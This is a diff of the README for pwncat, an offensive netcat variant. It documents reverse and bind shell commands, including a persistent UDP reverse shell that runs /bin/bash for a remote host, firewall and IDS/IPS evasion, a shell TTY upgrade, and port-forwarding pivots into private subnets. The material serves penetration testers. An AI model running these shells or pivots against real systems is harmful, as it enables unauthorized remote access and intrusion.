@@ -4,9 +4,9 @@
 **[TL;DR](#coffee-tldr)** |
 **[Features](#star-features)** |
 **[Docs](#closed_book-documentation)** |
+**[Usage](#computer-usage)** |
 **[Examples](#bulb-examples)** |
 **[FAQ](#information_source-faq)** |
-**[Usage](#computer-usage)** |
 **[cytopia sec tools](#lock-cytopia-sec-tools)** |
 **[Contributing](#octocat-contributing)** |
 **[Disclaimer](#exclamation-disclaimer)** |
@@ -28,15 +28,13 @@
 
 
 > &nbsp;
-> #### Netcat on steroids with Firewall and IPS evasion, bind and reverse shell, and local port forwarding.
+> #### Netcat on steroids with Firewall and IDS/IPS evasion, bind and reverse shell and port forwarding magic.
 > &nbsp;
 
 | :warning: Warning: it is currently in feature-incomplete alpha state. Expect bugs and options to change. ([Roadmap](https://github.com/cytopia/pwncat/issues/2)) |
 |---|
 
-
-### Motivation
-
+#### Motivation
 Ever accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?
 Ever waited forever for your client to connect back to you, because the Firewall didn't let it out?
 Ever had a connection loss because an IPS closed suspicious ports?
@@ -56,7 +54,9 @@ pip install pwncat
 
 ## :coffee: TL;DR
 
-### Copy to target
+This is just a quick get-you-started overview. For more advanced techniques see **[:computer: Usage](#computer-usage)** or **[:bulb: Examples](#bulb-examples)**.
+
+### Deploy to target
 ```bash
 # Copy base64 data to clipboard from where you have internet access
 curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
@@ -65,6 +65,7 @@ curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
 echo "<BASE64 STRING>" | base64 -d > pwncat
 chmod +x pwncat
 ```
+
 ### Summon shells
 ```bash
 # Bind shell
@@ -79,17 +80,7 @@ pwncat -e '/bin/bash' example.com 4444 --recon --recon-wait 10
 pwncat -e '/bin/bash' example.com 4444 -u --udp-ping-intvl 10
 ```
 
-### Proxy traffic
-
-> See here for SSH port-forwarding:<br>
-> https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/
-
-<sup>The only difference to SSH port-forwarding shown in the blog, is that in their case, the MySQL server is only available on localhost on the remote server.
-SSH portfowarding is exactly for this case, as it SSH's into the machine and can reach their local port.
-In the example here, we cannot SSH into the server, so we can only forward/proxy something which is externally available.
-That's why we just assume the MySQL server is listening publically on everythingcli.org (i.e, their port 3306 is externally available.)</sup>
-
-#### Local port forward `-L` (Proxy)
+### Local port forward `-L` (listening proxy)
 ```bash
 # Make remote MySQL server (remote port 3306) available on current machine
 # on every interface on port 5000
@@ -100,7 +91,7 @@ pwncat -L 0.0.0.0:5000 everythingcli.org 3306
 pwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u
 ```
 
-#### Remote port forward `-R` (Double client Proxy)
+### Remote port forward `-R` (double client Proxy)
 ```bash
 # Connect to Remote MySQL server (remote port 3306) and then connect to another
 # pwncat/netcat server on 10.0.0.1:4444 and bridge traffic
@@ -110,7 +101,9 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306
 # Same, but convert traffic on your end to UDP
 pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 ```
-Have a look at a more detailed **[port forwarding example with scenarios](#zap-port-forwarding)**.
+
+> <sub>[SSH Tunnelling for fun and profit :link:](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/)</sub><br/>
+> <sub>[`pwncat` example: Port forwarding magic](#port-forwarding-magic)<sub>
 
 
 ## :star: Features
@@ -143,188 +136,13 @@ Documentation will evolve over time.
 * Raw man page can be found here: [pwncat.1](man/pwncat.1)
 
 
-## :bulb: Examples
-
-Find below some more detailed and advanced examples.
-
-
-### :zap: Upgrade your shell to interactive
-> This is a universal advice and not only works with `pwncat`, but with all other common tools.
-
-When connected with a reverse or bind shell you'll notice that no interactive commands will work and
-hitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.
-To fix this, you'll need to attach it to a TTY. Here's how:
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-<kbd>Ctrl</kbd>+<kbd>z</kbd>
-```bash
-stty size
-stty echo -raw
-fg
-reset
-export SHELL=bash
-export TERM=xterm
-stty rows <num> columns <num>   # values found above by 'stty size'
-```
-
-
-### :zap: Unbreakable UDP reverse shell
-
-Why unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.
-```bash
-# The client
-# --exec            # Provide this executable
-# --nodns           # Keep the noise down and don't resolve hostnames
-# --udp             # Use UDP mode
-# --udp-ping-intvl  # Ping the server every 10 seconds
-
-pwncat --exec /bin/bash --nodns --udp --udp-ping-intvl 10 10.0.0.1 4444
-```
-If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
-```bash
-# The server
-# -u   # Use UDP mode
-# -l   # Listen for incoming connections
-pwncat -u -l -vvvvv
-```
-You will see (among all the gibberish) a TRACE message:
-```
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'
-```
-As soon as you saw this on the listener, you can issue commands to the client.
-All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate
-your server and start it again in silent mode:
-```bash
-# The server
-pwncat -u -l -vvvvv
-```
-Now wait a maximum of 10 seconds and you can issue commands.
-Having no info messages at all, is also troublesome. You might want to know what is going
-on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
-the notifications to a logfile:
-```bash
-# The server
-# 2> comm.txt   # This redirects the messages to a logfile instead
-pwncat -u -l -vvv 2> comm.txt
-```
-Now all you'll see in your server window are the actual command inputs and outputs.
-If you want to see what's going on behind the scene, open a second terminal window and tail
-the `comm.txt` file:
-```
-# View communication info
-tail -fn50 comm.txt
-
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-```
-
-### :zap: Port forwarding
-
-#### Local TCP port forwarding
-
-**Scenario**
-1. Alice can be reached from the Outside (TCP/UDP)
-2. Bob can only be reached from Alice's machine
-```
-                              |                               |
-        Outside               |           DMZ                 |        private subnet
-                              |                               |
-                              |                               |
-     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
-     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
-     |                 |      |      | pwncat          |      |      | MySQL           |
-     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
-     +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat 72.0.0.1 3306     |      pwncat \                 |
-                              |        -L 72.0.0.1:3306 \     |
-                              |         10.0.0.1 3306         |
-```
-
-#### Local UDP port forwarding
-
-**Scenario**
-1. Alice can be reached from the Outside (but only via UDP)
-2. Bob can only be reached from Alice's machine
-```
-                              |                               |
-        Outside               |           DMZ                 |        private subnet
-                              |                               |
-                              |                               |
-     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
-     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
-     |                 |      |      | pwncat -L       |      |      | MySQL           |
-     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
-     +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -u 72.0.0.1 3306  |      pwncat -u \              |
-                              |        -L 72.0.0.1:3306 \     |
-                              |        10.0.0.1 3306          |
-```
-
-#### Remote TCP port forward
-
-**Scenario**
-1. Alice cannot be reached from the Outside
-2. Alice is allowed to connect to the Outside (TCP/UDP)
-3. Bob can only be reached from Alice's machine
-```
-                              |                               |
-        Outside               |           DMZ                 |        private subnet
-                              |                               |
-                              |                               |
-     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
-     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
-     |                 |      |      | pwncat          |      |      | MySQL           |
-     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
-     +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -l 4444           |      pwncat --reconn \        |
-                              |        -R 56.0.0.1:4444 \     |
-                              |        10.0.0.1 3306          |
-```
-
-#### Remote UDP port forward
-
-**Scenario**
-1. Alice cannot be reached from the Outside
-2. Alice is allowed to connect to the Outside (UDP: DNS only)
-3. Bob can only be reached from Alice's machine
-```
-                              |                               |
-        Outside               |           DMZ                 |        private subnet
-                              |                               |
-                              |                               |
-     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
-     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
-     |                 |      |      | pwncat          |      |      | MySQL           |
-     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
-     +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -u -l 53          |      pwncat -u --reconn \     |
-                              |        -R 56.0.0.1:4444 \     |
-                              |        10.0.0.1 3306          |
-```
-
-
-## :information_source: FAQ
-
-**Q**: Is `pwncat` compatible with `netcat`?
-
-**A**: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.
-
-
-**Q**: Does it work on X?
-
-**A**: In its current state it works with Python 2 and 3 and is fully tested on Linux and MacOS. Windows support is still experimental.
-
-
-**Q**: I found a bug / I have to suggest a new feature! What can I do?
-
-**A**: For bug reports or enhancements, please open an issue [here](https://github.com/cytopia/pwncat/issues).
-
-
 ## :computer: Usage
+
+See all available options below.
+
+<details>
+  <summary><stront>Click to expand</strong></summary>
+
 ```
 usage: pwncat [-Cnuv] [-e cmd] hostname port
        pwncat [-Cnuv] [-e cmd] -l [hostname] port
@@ -485,6 +303,207 @@ misc arguments:
   -h, --help            Show this help message and exit
   -V, --version         Show version information and exit
 ```
+</details>
+
+
+## :bulb: Examples
+
+### Upgrade your shell to interactive
+<!--
+<details>
+  <summary>Click to expand</summary>
+-->
+
+> This is a universal advice and not only works with `pwncat`, but with all other common tools.
+
+When connected with a reverse or bind shell you'll notice that no interactive commands will work and
+hitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.
+To fix this, you'll need to attach it to a TTY. Here's how:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+<kbd>Ctrl</kbd>+<kbd>z</kbd>
+```bash
+stty size
+stty echo -raw
+fg
+reset
+export SHELL=bash
+export TERM=xterm
+stty rows <num> columns <num>   # values found above by 'stty size'
+```
+<!--
+</details>
+-->
+
+### Unbreakable UDP reverse shell
+
+<!--
+<details>
+  <summary>Click to expand</summary>
+-->
+
+Why unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.
+```bash
+# The client
+# --exec            # Provide this executable
+# --nodns           # Keep the noise down and don't resolve hostnames
+# --udp             # Use UDP mode
+# --udp-ping-intvl  # Ping the server every 10 seconds
+
+pwncat --exec /bin/bash --nodns --udp --udp-ping-intvl 10 10.0.0.1 4444
+```
+If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
+```bash
+# The server
+# -u   # Use UDP mode
+# -l   # Listen for incoming connections
+pwncat -u -l -vvvvv
+```
+You will see (among all the gibberish) a TRACE message:
+```
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'
+```
+As soon as you saw this on the listener, you can issue commands to the client.
+All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate
+your server and start it again in silent mode:
+```bash
+# The server
+pwncat -u -l -vvvvv
+```
+Now wait a maximum of 10 seconds and you can issue commands.
+Having no info messages at all, is also troublesome. You might want to know what is going
+on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
+the notifications to a logfile:
+```bash
+# The server
+# 2> comm.txt   # This redirects the messages to a logfile instead
+pwncat -u -l -vvv 2> comm.txt
+```
+Now all you'll see in your server window are the actual command inputs and outputs.
+If you want to see what's going on behind the scene, open a second terminal window and tail
+the `comm.txt` file:
+```
+# View communication info
+tail -fn50 comm.txt
+
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+```
+<!--
+</details>
+-->
+
+### Port forwarding magic
+
+<!--
+<details>
+  <summary>Click to expand</summary>
+-->
+
+#### Local TCP port forwarding
+
+**Scenario**
+1. Alice can be reached from the Outside (TCP/UDP)
+2. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
+     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat          |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat 72.0.0.1 3306     |      pwncat \                 |
+                              |        -L 72.0.0.1:3306 \     |
+                              |         10.0.0.1 3306         |
+```
+
+#### Local UDP port forwarding
+
+**Scenario**
+1. Alice can be reached from the Outside (but only via UDP)
+2. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
+     | The cat         | -----|----> | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat -L       |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat -u 72.0.0.1 3306  |      pwncat -u \              |
+                              |        -L 72.0.0.1:3306 \     |
+                              |        10.0.0.1 3306          |
+```
+
+#### Remote TCP port forward
+
+**Scenario**
+1. Alice cannot be reached from the Outside
+2. Alice is allowed to connect to the Outside (TCP/UDP)
+3. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     TCP     +-----------------+     TCP     +-----------------+
+     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat          |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat -l 4444           |      pwncat --reconn \        |
+                              |        -R 56.0.0.1:4444 \     |
+                              |        10.0.0.1 3306          |
+```
+
+#### Remote UDP port forward
+
+**Scenario**
+1. Alice cannot be reached from the Outside
+2. Alice is allowed to connect to the Outside (UDP: DNS only)
+3. Bob can only be reached from Alice's machine
+```
+                              |                               |
+        Outside               |           DMZ                 |        private subnet
+                              |                               |
+                              |                               |
+     +-----------------+     UDP     +-----------------+     TCP     +-----------------+
+     | The cat         | <----|----- | Alice           | -----|----> | Bob             |
+     |                 |      |      | pwncat          |      |      | MySQL           |
+     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
+     +-----------------+      |      +-----------------+      |      +-----------------+
+     pwncat -u -l 53          |      pwncat -u --reconn \     |
+                              |        -R 56.0.0.1:4444 \     |
+                              |        10.0.0.1 3306          |
+```
+<!--
+</details>
+-->
+
+## :information_source: FAQ
+
+**Q**: Is `pwncat` compatible with `netcat`?
+
+**A**: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.
+
+
+**Q**: Does it work on X?
+
+**A**: In its current state it works with Python 2 and 3 and is fully tested on Linux and MacOS. Windows support is still experimental.
+
+
+**Q**: I found a bug / I have to suggest a new feature! What can I do?
+
+**A**: For bug reports or enhancements, please open an issue [here](https://github.com/cytopia/pwncat/issues).
 
 
 ## :lock: [cytopia](https://github.com/cytopia) sec tools
